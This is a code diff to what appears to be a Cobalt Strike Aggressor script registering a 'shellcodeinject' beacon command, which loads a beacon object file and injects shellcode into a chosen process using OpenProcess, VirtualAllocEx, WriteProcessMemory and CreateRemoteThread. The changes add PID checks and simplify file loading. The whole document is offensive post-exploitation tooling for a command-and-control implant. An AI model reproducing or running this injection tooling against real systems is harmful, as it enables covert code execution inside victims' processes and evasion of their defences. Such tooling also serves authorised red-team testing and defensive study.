@@ -2,7 +2,7 @@
 # $2 = pid
 
 alias shellcodeinject {
-	local('$handle $pid');
+	local('$bid $handle $data $pid');
 
 	# check our arguments
 	if (size(@_) != 2) {
@@ -13,9 +13,15 @@ alias shellcodeinject {
 	# parse our arguments
 	$pid	= $2;
 
+	# Verify PID is a number
+	if ((!-isnumber $pid) || (int($pid) <= 0))
+	{
+		berror($1, "shellcodeinject: enter a valid PID");
+		return;
+	}
+
 	# read in our BOF file...
-	$arch = barch($1);
-	$handle = openf(script_resource("shellcodeinject. $+ $arch $+ .o"));
+	$handle = openf(script_resource("shellcodeinject.o"));
 	$data	= readb($handle, -1);
 	closef($handle);
 
@@ -28,5 +34,5 @@ alias shellcodeinject {
 	# run a BOF
 	beacon_inline_execute($1, $data, "go", $args);
 }
-beacon_command_register("shellcodeinject", "Basic PE shellcode injection method", "Synopsis: shellcodeinject [pid] \n\nBasic OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread Win32APIs in a beacon object file to inject into a target PID.");
+beacon_command_register("shellcodeinject", "Basic PE shellcode injection method", "Synopsis: shellcodeinject [pid] \n\nBasic OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread\nWin32APIs in a beacon object file to inject into a target PID.");
 
